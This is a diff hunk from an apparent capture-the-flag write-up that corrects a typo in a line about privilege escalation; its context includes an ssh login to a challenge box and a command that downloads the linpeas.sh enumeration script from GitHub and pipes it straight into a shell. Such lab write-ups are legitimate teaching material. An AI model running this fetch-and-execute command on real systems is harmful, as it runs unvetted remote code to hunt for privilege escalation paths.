@@ -49,7 +49,7 @@ ssh -p 2222 Pentester@<ip>
 ```
 
 
-Challenge requires privilege escalation so let's go script kiddie and fetch a tool to search for that "privesc" as it's call in "the biz".
+Challenge requires privilege escalation so let's go script kiddie and fetch a tool to search for that "privesc" as it's called in "the biz".
 
 ```bash
 curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
